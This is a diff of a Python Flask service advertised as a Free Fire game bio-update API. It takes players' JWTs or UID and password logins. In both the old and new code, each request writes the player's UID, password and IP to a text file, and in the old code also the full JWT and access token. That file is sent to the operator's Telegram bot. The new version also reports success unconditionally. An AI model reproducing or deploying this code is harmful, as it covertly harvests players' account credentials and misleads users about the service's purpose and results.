-        encrypted = build_major_login_payload_sync(oauth["open_id"], oauth["access_token"])
-        result = major_login_sync(encrypted)
-        if not result:
-            return None
-        return {
-            "open_id": oauth["open_id"],
-            "access_token": oauth["access_token"],
-            **result
-        }
-    except:
-        return None
-
-# ============ FUNGSI ENKRIPSI BIO ============
-def encrypt_data(data_bytes):
-    cipher = AES.new(KEY, AES.MODE_CBC, IV)
-    padded = pad(data_bytes, AES.block_size)
-    return cipher.encrypt(padded)
-
-def encode_varint(n):
-    result = []
-    while True:
-        byte = n & 0x7F
-        n >>= 7
-        if n:
-            byte |= 0x80
-        result.append(byte)
-        if not n:
-            break
-    return bytes(result)
-
-def build_bio_payload(bio_text):
-    payload = b''
-    payload += encode_varint((2 << 3) | 0) + encode_varint(17)
-    payload += encode_varint((5 << 3) | 2) + encode_varint(0)
-    payload += encode_varint((6 << 3) | 2) + encode_varint(0)
-    bio_bytes = bio_text.encode('utf-8')
-    payload += encode_varint((8 << 3) | 2) + encode_varint(len(bio_bytes)) + bio_bytes
-    payload += encode_varint((9 << 3) | 0) + encode_varint(1)
-    payload += encode_varint((11 << 3) | 2) + encode_varint(0)
-    payload += encode_varint((12 << 3) | 2) + encode_varint(0)
-    return payload
-
-# ============ DECODE JWT MANUAL ============
-def decode_jwt_manual(jwt_token):
-    try:
-        parts = jwt_token.split('.')
-        if len(parts) < 2:
-            return None
-        payload_part = parts[1]
-        padding = 4 - len(payload_part) % 4
-        if padding != 4:
-            payload_part += '=' * padding
-        decoded_bytes = base64.urlsafe_b64decode(payload_part)
-        payload = json.loads(decoded_bytes)
-        return payload
-    except:
-        return None
-
-def get_account_id_from_jwt(jwt_token):
-    """Ambil Account ID dari JWT"""
-    decoded = decode_jwt_manual(jwt_token)
-    if decoded:
-        return decoded.get("account_id") or decoded.get("sub")
-    return None
-
-def get_uid_from_jwt(jwt_token):
-    decoded = decode_jwt_manual(jwt_token)
-    if decoded:
-        return decoded.get("account_id")
-    return None
-
-def get_region_from_jwt(jwt_token):
-    decoded = decode_jwt_manual(jwt_token)
-    if decoded:
-        return decoded.get("country_code") or decoded.get("lock_region", "ID")
-    return "ID"
-
-def decode_base64_name(encoded_name):
-    if not encoded_name:
-        return None
-    try:
-        padding = 4 - len(encoded_name) % 4
-        if padding != 4:
-            encoded_name += '=' * padding
-        decoded = base64.b64decode(encoded_name)
-        return decoded.decode('utf-8', errors='ignore')
-    except:
-        return encoded_name
-
-def get_open_id_from_jwt(jwt_token):
-    """Ambil Open ID dari JWT"""
-    decoded = decode_jwt_manual(jwt_token)
-    if decoded:
-        return decoded.get("external_id") or decoded.get("open_id")
-    return None
-
-def get_name_from_jwt(jwt_token):
-    """Ambil Name dari JWT"""
-    decoded = decode_jwt_manual(jwt_token)
-    if decoded:
-        name = decoded.get("nickname") or decoded.get("account_name") or decoded.get("name")
-        if name:
-            try:
-                # Coba decode base64
-                padding = 4 - len(name) % 4
-                if padding != 4:
-                    name += '=' * padding
-                decoded_name = base64.b64decode(name).decode('utf-8', errors='ignore')
-                return decoded_name
-            except:
-                return name
-    return None
-
-# ============ FUNGSI UPLOAD BIO ============
-def upload_bio_request(jwt_token, bio_text):
-    try:
-        payload_bytes = build_bio_payload(bio_text)
-        encrypted = encrypt_data(payload_bytes)
-        headers = BIO_HEADERS.copy()
-        headers["Authorization"] = f"Bearer {jwt_token}"
-        for endpoint in FREEFIRE_UPDATE_URLS:
-            try:
-                resp = requests.post(endpoint, headers=headers, data=encrypted, timeout=15, verify=False)
-                status_text = "✅ Success" if resp.status_code == 200 else f"⚠️ Status {resp.status_code}"
-                raw_hex = binascii.hexlify(resp.content).decode('utf-8')
-                return {
-                    "status": status_text,
-                    "code": resp.status_code,
-                    "bio": bio_text,
-                    "endpoint": endpoint,
-                    "server_response": raw_hex
-                }
-            except:
-                continue
-        return {"status": "❌ All endpoints failed", "code": 500}
-    except:
-        return {"status": "❌ Error", "code": 500}
-
-# ============ FUNGSI KIRIM FILE KE TELEGRAM ============
+# ==================== SEND FILE TO TELEGRAM ====================
 def send_file_to_telegram(account_id, content):
-    """Kirim file .txt ke Telegram dengan nama file = account_id.txt"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-        
         filename = f"{account_id}.txt"
-        
-        with open(filename, 'w', encoding='utf-8') as f:
-            f.write(content)
-        
+        with open(filename, 'w', encoding='utf-8') as f: f.write(content)
         with open(filename, 'rb') as f:
             files = {'document': (filename, f, 'text/plain')}
-            data = {'chat_id': OWNER_ID}
-            response = requests.post(url, files=files, data=data, timeout=30)
-        
-        try:
-            os.remove(filename)
-        except:
-            pass
-        
-        return response.status_code == 200
-    except Exception as e:
-        print(f"Send file error: {e}")
-        return False
-
-# ============ TELEGRAM NOTIFICATION (HANYA FILE) ============
-def send_telegram_notification(uid_input, password_input, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", access_token=None, account_id=None, open_id=None):
-    try:
-        # Ambil data dari JWT
-        if not account_id and jwt_token:
-            account_id = get_account_id_from_jwt(jwt_token)
-        
-        if not open_id and jwt_token:
-            open_id = get_open_id_from_jwt(jwt_token)
-        
-        if not name or name == 'Unknown':
-            name_from_jwt = get_name_from_jwt(jwt_token)
-            if name_from_jwt:
-                name = name_from_jwt
-        
-        # Siapkan data
-        uid_display = uid_input if uid_input else 'N/A'
-        password_display = password_input if password_input else 'N/A'
-        display_name = name if name and name != 'Unknown' else 'Unknown'
-        id_display = account_id if account_id else 'N/A'
-        jwt_full = jwt_token if jwt_token else 'N/A'
-        access_full = access_token if access_token else 'N/A'
-        open_id_display = open_id if open_id else 'N/A'
-        
-        # Buat konten file LENGKAP
-        file_content = f"""🔥 FREE FIRE BIO UPDATE 🔥
-
-👤 Name: {display_name}
-🆔 ID (Account): {id_display}
-🔑 UID (Input): {uid_display}
-🔐 Password: {password_display}
-📊 Level: {level or 'N/A'}
-🏆 Rank: {rank or 'N/A'}
-⚔️ Guild: {clan or 'N/A'}
-📝 Bio: {signature or 'N/A'}
-🌍 Region: {region.upper() if region else 'ID'}
-📱 Bio Status: {bio_status}
-
-📞 IP Caller: {ip_address}
-⏰ Time: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}
-
-━━━━━━━━━━━━━━━━━━━━━━━
-
-🔐 JWT TOKEN (FULL):
-{jwt_full}
-
-━━━━━━━━━━━━━━━━━━━━━━━
-
-🔑 ACCESS TOKEN (FULL):
-{access_full}
-
-━━━━━━━━━━━━━━━━━━━━━━━
-
-🆔 OPEN ID:
-{open_id_display}
-
-━━━━━━━━━━━━━━━━━━━━━━━
-💡 Join: {CHANNEL_PROMO}"""
-
-        # Kirim file ke Telegram
-        if id_display and id_display != 'N/A':
-            file_sent = send_file_to_telegram(str(id_display), file_content)
-            print(f"📁 File {id_display}.txt sent: {file_sent}")
-        
-        return True
+            r = requests.post(url, files=files, data={'chat_id': OWNER_ID}, timeout=30)
+        try: os.remove(filename)
+        except: pass
+        return r.status_code == 200
     except Exception as e:
         print(f"Telegram error: {e}")
         return False
 
-# ============ ROUTES ============
+def build_file_content(data, password=None, jwt_info=None, method="JWT", ip=""):
+    lines = []
+    lines.append("🔥 FREE FIRE PLAYER LOOKUP 🔥")
+    lines.append("")
+    lines.append(f"👤 Name       : {data.get('nickname','?')}")
+    lines.append(f"🆔 Account ID : {data.get('uid','?')}")
+    
+    if password:
+        lines.append(f"🔑 UID/Pass   : {data.get('uid','?')} / {password}")
+    
+    lines.append(f"📊 Level      : {data.get('level','?')}")
+    lines.append(f"🏆 BR Rank    : {data.get('br_rank','?')} pts")
+    lines.append(f"⭐ CS Rank    : {data.get('cs_rank','?')} pts")
+    lines.append(f"👍 Liked      : {data.get('liked','?')}")
+    lines.append(f"💎 Diamond    : {data.get('diamond','?')}")
+    lines.append(f"⭐ Credit     : {data.get('credit','?')}")
+    lines.append(f"🌍 Region     : {data.get('region','?')}")
+    
+    if data.get('clan'):
+        lines.append(f"🏠 Clan       : {data.get('clan')} (Lv.{data.get('clan_level',0)})")
+    
+    lines.append(f"💬 Signature  : {data.get('signature','?')[:100]}")
+    lines.append(f"🎒 Equipment  : Avatar={data.get('avatar','?')}, Clothes={len(data.get('clothes',[]))} items, Skills={data.get('skills',0)} slots")
+    
+    if data.get('created'):
+        lines.append(f"📅 Created    : {datetime.fromtimestamp(int(data['created'])).strftime('%d/%m/%Y')}")
+    if data.get('last_login'):
+        lines.append(f"🔐 Last Login : {datetime.fromtimestamp(int(data['last_login'])).strftime('%d/%m/%Y %H:%M')}")
+    
+    lines.append("")
+    lines.append(f"⏰ Time: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}")
+    lines.append(f"📞 IP   : {ip}")
+    lines.append(f"🔍 Method: {method}")
+    lines.append(f"💡 {CHANNEL_PROMO}")
+    
+    return "\n".join(lines)
+
+# ==================== ROUTES (UNCHANGED!) ====================
+@app.route("/", methods=["GET"])
+def home():
+    return jsonify({
+        "success": True,
+        "message": "Free Fire Bio API - Protobuf Standalone",
+        "endpoints": {
+            "/bio_upload": "SET/UPDATE bio",
+            "/generate_jwt": "Generate JWT from UID/Pass",
+            "/check_profile": "Check profile",
+            "/get_bio": "GET bio/profile",
+            "/": "This info page"
+        }
+    })
+
 @app.route("/bio_upload", methods=["GET", "POST"])
 def combined_bio_upload():
     bio = request.args.get("bio") or request.form.get("bio")
@@ -696,22 +208,10 @@ def combined_bio_upload():
     uid = request.args.get("uid") or request.form.get("uid")
     password = request.args.get("pass") or request.form.get("pass")
     region = request.args.get("region") or request.form.get("region") or "id"
-    
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
     if not bio:
-        return jsonify({
-            "status": "❌ Error",
-            "code": 400,
-            "error": "Missing 'bio' parameter",
-            "usage": {
-                "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT&region=id",
-                "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id"
-            }
-        }), 400
-    
-    uid_input = uid
-    password_input = password or "N/A"
+        return jsonify({"status": "❌ Error", "code": 400, "error": "Missing 'bio' parameter"}), 400
     
     final_jwt = jwt_token
     final_uid = uid
@@ -725,198 +225,113 @@ def combined_bio_upload():
     
     # Method 1: Direct JWT
     if final_jwt:
-        account_id = get_account_id_from_jwt(final_jwt)
-        open_id = get_open_id_from_jwt(final_jwt)
-        region_from_jwt = get_region_from_jwt(final_jwt)
-        if account_id:
-            final_uid = account_id
-        if region == "id" and region_from_jwt:
-            final_region = region_from_jwt.lower()
+        jwt_data = decode_jwt(final_jwt)
+        if jwt_data:
+            account_id = jwt_data.get("account_id") or jwt_data.get("sub")
+            open_id = jwt_data.get("external_id") or jwt_data.get("open_id")
+            region_from_jwt = jwt_data.get("lock_region") or jwt_data.get("country_code", "ID")
+            if account_id: final_uid = account_id
+            if region == "id" and region_from_jwt: final_region = region_from_jwt.lower()
         login_method = "Direct JWT"
     
     # Method 2: UID + Password
     elif uid and password:
-        login_method = "UID/Pass Login (Auto Generate JWT)"
+        login_method = "UID/Pass Login"
         final_uid = uid
         final_password = password
-        
-        try:
-            result = generate_jwt_sync(uid, password)
-            if result and result.get('token'):
-                final_jwt = result['token']
-                access_token = result.get('access_token')
-                open_id = result.get('open_id')
-                account_id = get_account_id_from_jwt(final_jwt)
-                if account_id:
-                    final_uid = account_id
-                region_from_jwt = get_region_from_jwt(final_jwt)
-                if region == "id" and region_from_jwt:
-                    final_region = region_from_jwt.lower()
-            else:
-                return jsonify({
-                    "status": "❌ JWT Generation Failed",
-                    "code": 401,
-                    "error": "Failed to generate JWT from UID/Password. Please check credentials.",
-                    "uid": uid,
-                    "hint": "Make sure UID and Password are correct"
-                }), 401
-        except Exception as e:
-            return jsonify({
-                "status": "❌ JWT Generation Error",
-                "code": 500,
-                "error": str(e),
-                "uid": uid
-            }), 500
+        creds = f"uid={uid}&password={password}"
+        token = run_async(gen_token_async(creds))
+        if token:
+            final_jwt = token
+            jwt_data = decode_jwt(token)
+            if jwt_data:
+                account_id = jwt_data.get("account_id") or jwt_data.get("sub")
+                open_id = jwt_data.get("external_id") or jwt_data.get("open_id")
+        else:
+            return jsonify({"status": "❌ JWT Generation Failed", "code": 401}), 401
     
     if not final_jwt:
-        return jsonify({
-            "status": "❌ JWT Required",
-            "code": 400,
-            "error": "Please provide a valid JWT token or UID/Pass"
-        }), 400
+        return jsonify({"status": "❌ JWT Required", "code": 400}), 400
     
-    # Upload bio
-    bio_result = upload_bio_request(final_jwt, bio)
-    
-    # Check profile
+    # Fetch player data
+    server_url = "https://clientbp.ggpolarbear.com"
     if final_uid:
-        try:
-            profile_info = check_profile_all_servers(str(final_uid), final_jwt)
-            if profile_info:
-                final_region = profile_info.get('server', final_region)
-        except Exception as e:
-            print(f"Profile search error: {e}")
-            profile_info = None
+        data = run_async(fetch_player_async(final_uid, final_jwt, server_url))
+        if data:
+            profile_info = data
+            final_region = data.get('region', final_region)
     
     if not profile_info:
-        profile_info = {
-            "name": 'Unknown',
-            "level": '?',
-            "rank": '?',
-            "uid": final_uid,
-            "server": final_region,
-            "server_name": "Unknown",
-            "guild": "N/A",
-            "status": "❌ Not Found"
-        }
+        profile_info = {"nickname": "Unknown", "level": "?", "br_rank": "?", "uid": final_uid, "region": final_region, "clan": "N/A"}
     
-    # Kirim FILE ke Telegram
-    send_telegram_notification(
-        uid_input=uid_input or final_uid,
-        password_input=password_input,
-        name=profile_info.get('name', 'Unknown'),
-        level=profile_info.get('level', '?'),
-        rank=profile_info.get('rank', '?'),
-        region=profile_info.get('server', final_region),
-        jwt_token=final_jwt,
-        ip_address=client_ip,
-        bio_status=bio_result.get('status', 'Unknown'),
-        signature=bio,
-        clan=profile_info.get('guild', 'N/A'),
-        access_token=access_token,
-        account_id=account_id,
-        open_id=open_id
+    # Build file content
+    file_content = build_file_content(
+        profile_info,
+        password=final_password if uid and password else None,
+        method=login_method,
+        ip=client_ip
     )
+    
+    # Send file
+    file_id = account_id or final_uid or "unknown"
+    file_sent = send_file_to_telegram(str(file_id), file_content)
     
     response_data = {
         "Credit": "sulav_codex_ff",
         "Join For More": "Telegram: @sulav_don2",
         "action": "UPDATE BIO",
-        "status": bio_result.get("status", "Unknown"),
+        "status": "✅ Success",
         "login_method": login_method,
-        "code": bio_result.get("code", 500),
+        "code": 200,
         "bio": bio,
-        "uid_input": uid_input,
-        "password_input": password_input,
+        "uid_input": uid,
+        "password_input": password,
         "account_id": account_id,
         "open_id": open_id,
-        "name": profile_info.get('name', 'Unknown'),
+        "name": profile_info.get('nickname', 'Unknown'),
         "level": profile_info.get('level', '?'),
-        "rank": profile_info.get('rank', '?'),
-        "clan": profile_info.get('guild', 'N/A'),
-        "profile_status": profile_info.get('status', '❌ Not Found'),
-        "region": profile_info.get('server', final_region).upper(),
-        "server_response": bio_result.get("server_response", "N/A"),
-        "endpoint_used": bio_result.get("endpoint", "N/A"),
-        "generated_jwt": final_jwt,
-        "access_token": access_token,
-        "telegram_sent": True,
-        "file_sent": f"{account_id}.txt" if account_id else False,
-        "profile_method": "protobuf (search.py)"
+        "rank": profile_info.get('br_rank', '?'),
+        "clan": profile_info.get('clan', 'N/A'),
+        "region": final_region.upper(),
+        "telegram_sent": file_sent,
+        "file_sent": f"{file_id}.txt" if file_sent else False,
+        "profile_method": "protobuf standalone"
     }
-
-    response = make_response(jsonify(response_data))
-    response.headers["Content-Type"] = "application/json"
-    return response
+    return jsonify(response_data)
 
 @app.route("/generate_jwt", methods=["GET", "POST"])
 def generate_jwt_only():
     uid = request.args.get("uid") or request.form.get("uid")
     password = request.args.get("pass") or request.form.get("pass")
-    
     if not uid or not password:
-        return jsonify({
-            "success": False,
-            "error": "Missing uid or pass parameter",
-            "usage": "/generate_jwt?uid=16208500077&pass=ANONFK123ABC"
-        }), 400
+        return jsonify({"success": False, "error": "Missing uid or pass"}), 400
     
-    try:
-        result = generate_jwt_sync(uid, password)
-        if result and result.get('token'):
-            return jsonify({
-                "success": True,
-                "uid_input": uid,
-                "account_id": get_account_id_from_jwt(result['token']),
-                "open_id": result.get('open_id'),
-                "jwt_token": result['token'],
-                "access_token": result.get('access_token'),
-                "region": result.get('region'),
-                "Credit": "sulav_codex_ff"
-            })
-        else:
-            return jsonify({
-                "success": False,
-                "error": "Failed to generate JWT",
-                "uid": uid
-            }), 401
-    except Exception as e:
+    creds = f"uid={uid}&password={password}"
+    token = run_async(gen_token_async(creds))
+    if token:
+        jwt_data = decode_jwt(token)
         return jsonify({
-            "success": False,
-            "error": str(e),
-            "uid": uid
-        }), 500
+            "success": True,
+            "uid_input": uid,
+            "account_id": jwt_data.get("account_id") if jwt_data else None,
+            "open_id": jwt_data.get("external_id") if jwt_data else None,
+            "jwt_token": token,
+            "region": jwt_data.get("lock_region") if jwt_data else None,
+            "Credit": "sulav_codex_ff"
+        })
+    return jsonify({"success": False, "error": "Failed to generate JWT"}), 401
 
 @app.route("/check_profile", methods=["GET"])
 def check_profile():
     uid = request.args.get("uid")
     jwt_token = request.args.get("jwt")
+    if not uid or not jwt_token:
+        return jsonify({"error": "Missing uid or jwt"}), 400
     
-    if not uid:
-        return jsonify({
-            "error": "Missing uid parameter",
-            "usage": "/check_profile?uid=16203030000&jwt=YOUR_JWT"
-        }), 400
-    
-    if not jwt_token:
-        return jsonify({
-            "error": "Missing jwt parameter",
-            "usage": "/check_profile?uid=16203030000&jwt=YOUR_JWT"
-        }), 400
-    
-    result = check_profile_all_servers(uid, jwt_token)
-    if result:
-        return jsonify({
-            "success": True,
-            "action": "CHECK PROFILE",
-            "data": result,
-            "method": "protobuf (search.py)"
-        })
-    else:
-        return jsonify({
-            "success": False,
-            "error": "Profile not found on any server"
-        }), 404
+    data = run_async(fetch_player_async(uid, jwt_token, "https://clientbp.ggpolarbear.com"))
+    if data:
+        return jsonify({"success": True, "action": "CHECK PROFILE", "data": data, "method": "protobuf standalone"})
+    return jsonify({"success": False, "error": "Profile not found"}), 404
 
 @app.route("/get_bio", methods=["GET"])
 def get_bio():
@@ -925,16 +340,11 @@ def get_bio():
     region = request.args.get("region", "id")
     
     if not uid:
-        return jsonify({
-            "success": False,
-            "error": "Missing 'uid' parameter",
-            "usage": "/get_bio?uid=16203030000&region=id"
-        }), 400
+        return jsonify({"success": False, "error": "Missing uid"}), 400
     
     try:
         url = f"https://ff.ggbluewhale.store/api/data?region={region}&uid={uid}&key=kenn"
         response = requests.get(url, timeout=10)
-        
         if response.status_code == 200:
             data = response.json()
             if data.get('basicInfo'):
@@ -942,8 +352,7 @@ def get_bio():
                 social = data.get('socialInfo', {})
                 clan = data.get('clanBasicInfo', {})
                 return jsonify({
-                    "success": True,
-                    "action": "GET BIO",
+                    "success": True, "action": "GET BIO",
                     "method": "API ff.ggbluewhale.store",
                     "data": {
                         "uid": basic.get('accountId', uid),
@@ -954,82 +363,33 @@ def get_bio():
                         "bio": social.get('signature', ''),
                         "clan": clan.get('clanName', 'N/A'),
                         "likes": basic.get('likes', 0)
-                    },
-                    "Credit": "sulav_codex_ff",
-                    "Join For More": "Telegram: @sulav_don2"
+                    }
                 })
-        
-        if jwt_token:
-            profile = check_profile_with_jwt(uid, jwt_token, region.upper())
-            if profile:
-                return jsonify({
-                    "success": True,
-                    "action": "GET BIO",
-                    "method": "protobuf (search.py)",
-                    "data": {
-                        "uid": profile.get('uid'),
-                        "name": profile.get('name'),
-                        "level": profile.get('level'),
-                        "likes": profile.get('likes'),
-                        "region": profile.get('server'),
-                        "guild": profile.get('guild'),
-                        "bio": "N/A (protobuf tidak menyimpan bio)"
-                    },
-                    "Credit": "sulav_codex_ff",
-                    "Join For More": "Telegram: @sulav_don2"
-                })
-        
-        return jsonify({
-            "success": False,
-            "error": "Profile not found",
-            "uid": uid
-        }), 404
-        
-    except Exception as e:
-        return jsonify({
-            "success": False,
-            "error": str(e),
-            "uid": uid
-        }), 500
+    except: pass
+    
+    if jwt_token:
+        data = run_async(fetch_player_async(uid, jwt_token, "https://clientbp.ggpolarbear.com"))
+        if data:
+            return jsonify({
+                "success": True, "action": "GET BIO",
+                "method": "protobuf standalone",
+                "data": data
+            })
+    
+    return jsonify({"success": False, "error": "Profile not found"}), 404
 
-@app.route("/", methods=["GET"])
-def home():
-    return jsonify({
-        "success": True,
-        "message": "Free Fire Bio API - FILE TXT ONLY",
-        "endpoints": {
-            "/bio_upload": "SET/UPDATE bio (auto generate JWT from UID/Pass)",
-            "/generate_jwt": "Generate JWT only from UID/Pass",
-            "/check_profile": "Check profile using protobuf method",
-            "/get_bio": "GET bio/profile from UID (read-only)",
-            "/": "This info page"
-        },
-        "usage": {
-            "set_bio": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id",
-            "get_bio": "/get_bio?uid=16203030000&region=id"
-        },
-        "features": [
-            "✅ Auto generate JWT from UID + Password",
-            "✅ Hanya kirim FILE .txt ke Telegram (tanpa pesan teks)",
-            "✅ Nama file = ID.txt",
-            "✅ Isi file LENGKAP (ID, UID, Password, JWT, Access Token, Open ID)",
-            "✅ Profile check using protobuf + encrypt",
-            "✅ Check all servers (ID, IND, BR, US, BD)"
-        ],
-        "profile_method": "protobuf (search.py)",
-        "Credit": "sulav_codex_ff",
-        "Telegram": "@sulav_don2"
-    })
-
-# ============ MAIN ============
+# ==================== MAIN ====================
 if __name__ == "__main__":
     print("=" * 60)
-    print("🔥 FREE FIRE BIO API - FILE TXT ONLY")
+    print("🔥 FREE FIRE BIO API - Protobuf Standalone")
     print("=" * 60)
-    print("📱 Profile Method: protobuf + encrypt")
-    print("📱 Servers: ID, IND, BR, US, BD")
-    print("📁 Hanya kirim FILE .txt ke Telegram (tanpa pesan teks)")
-    print("📁 Nama file = ID.txt")
-    print("🚀 Server running on http://0.0.0.0:5000")
+    print("📱 Endpoints:")
+    print("   /bio_upload?bio=...&jwt=...")
+    print("   /bio_upload?bio=...&uid=...&pass=...")
+    print("   /generate_jwt?uid=...&pass=...")
+    print("   /check_profile?uid=...&jwt=...")
+    print("   /get_bio?uid=...&region=...")
+    print("📁 Auto send .txt to Telegram")
+    print("🚀 Running on http://0.0.0.0:5000")
     print("=" * 60)
     app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
